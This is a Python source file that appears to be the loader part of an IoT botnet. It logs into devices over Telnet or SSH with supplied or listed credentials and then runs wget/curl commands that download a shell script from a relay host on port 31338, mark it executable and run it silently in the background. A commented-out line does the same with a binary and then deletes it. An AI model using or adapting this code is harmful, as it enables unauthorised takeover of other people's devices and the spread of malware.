import telnetlib
import sys
import os
import json
import time
from libs import truecolors
import paramiko
Host_IP = ""
filename = 'ip_config.ini'
with open(filename, 'r') as file:
    json_data = json.load(file)
Host_IP = json_data['RelayIP']
targetIP = json_data['targetIP']
Host_IP += ":31338"


def doTelnetLogin(ip, port, user, pass_):
    tn = None
    need_user = False
    while True:
        try:
            if not tn:
                asked_password_in_cnx = False
                tn = telnetlib.Telnet(ip, port)
                print(f"[loader] Connection established to given ip {ip} {port}" )
            while True:
                response = tn.read_until(b":", 1)
                if "Login:" in str(response) or "Username:" in str(response) or "login:" in str(response):
                    print("[loader] Received username prompt")
                    need_user = True
                    asked_password_in_cnx = False
                    user, password = user, pass_
                    tn.write((user + "\n").encode('ascii'))
                elif "Password:" in str(response) or "password" in str(response):  
                    if asked_password_in_cnx and need_user:
                        tn.close()
                        break
                    asked_password_in_cnx = True
                    if not need_user:
                        user, password = user, pass_
                    if not password:
                        print("[loader] Login has failed...quitting.")
                        sys.exit(0)
                    print("[loader] Received password prompt")
                    tn.write((password + "\n").encode('ascii'))
                if ">" in str(response) or "$" in str(response) or "#" in str(response) or "%" in str(response):
                    # broken
                    print("[loader] Login succeeded %s " % ip +" --> "+ ' : '.join((user, password)))
                    response = tn.read_until(b"#", 1)
                    #tn.write(("cd /tmp; cd/var/run; cd /mnt; cd/root; wget %s; chmod +x %s; ./%s; rm -rf %s;" % (__bin__,os.path.basename(__bin__), os.path.basename(__bin__), os.path.basename(__bin__)) + "\n").encode('ascii'))
                    cmd = "wget http://"+Host_IP+"/wget_download_exec.sh"  #test host ip => http://192.168.1.97:31338
                    cmd += " || "
                    cmd += "curl http://"+Host_IP+"/curl_download_exec.sh -o curl_download_exec.sh"
                    cmd1="chmod +x wget_download_exec.sh || chmod +x curl_download_exec.sh"
                    cmd2="(sh ./wget_download_exec.sh || sh ./curl_download_exec.sh) > /dev/null 2>&1 &"
                    tn.write((cmd+"\n").encode('ascii'))  
                    response = tn.read_until(b"#", 1)
                    print(str(response))
                    tn.write((cmd1+"\n").encode('ascii'))  
                    response = tn.read_until(b"#", 1)
                    print(str(response))
                    tn.write((cmd2+"\n").encode('ascii'))  
                    response = tn.read_until(b"#", 1)
                    print("Exec command "+cmd +"--> Successful")                
                    print("[loader] This device is broken. Use Telnet")
                    return
        except EOFError as e:
            tn = None
            need_user = False
            print("[scanner] Remote host dropped the connection (%s).." % str(e))

def doSSHLogin(ip, port, user, pass_):

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, port=port, username=user, password=pass_)
        #command="cd /tmp ; ls"
        cmd = "wget http://"+Host_IP+"/wget_download_exec.sh"  #test host ip => http://192.168.1.97:31338
        cmd += " || "
        cmd += "curl http://"+Host_IP+"/curl_download_exec.sh -o curl_download_exec.sh"
        cmd1="chmod +x wget_download_exec.sh || chmod +x curl_download_exec.sh"
        cmd2="(sh ./wget_download_exec.sh || sh ./curl_download_exec.sh) > /dev/null 2>&1 &"
        stdin, stdout, stderr = client.exec_command(cmd)
        output = stdout.read().decode('utf-8')
        print(output)
        time.sleep(1)
        stdin, stdout, stderr = client.exec_command(cmd1)
        output = stdout.read().decode('utf-8')
        print(output)
        time.sleep(1)
        stdin, stdout, stderr = client.exec_command(cmd2)
        output = stdout.read().decode('utf-8')
        print(output)
        print("Exec command --> Successful")                
        print("[loader] This device is broken. Use SSH")
    except paramiko.AuthenticationException:
        print("Authentication failed.")
    except paramiko.SSHException as e:
        print("SSH connection error: " + str(e))
    except paramiko.Exception as e:
        print("Error: " + str(e))
    finally:
        client.close()


def ForceDB(fname):
    try:
        if os.path.isfile(fname):
            with open(fname) as f:
                for line in f:
                    usr,psw,ip,port = line.split(":")
                    doTelnetLogin(ip, port, usr, psw)
        else:
            truecolors.print_errn("Loader: File '%s' doesn't exists, check the path." % fname)
    except KeyboardInterrupt:
        truecolors.print_errn("Operation interrupted.")
    except Exception as e:
        truecolors.print_errn("Loader: " + str(e))


if __name__ == '__main__':
    #Host_IP, targerIP = read_config_ip()
    #ForceDB(sys.argv[2])
    #doTelnetLogin("192.168.1.121", "23", "root", "password")
    doSSHLogin("192.168.1.163","22","admin","password")
    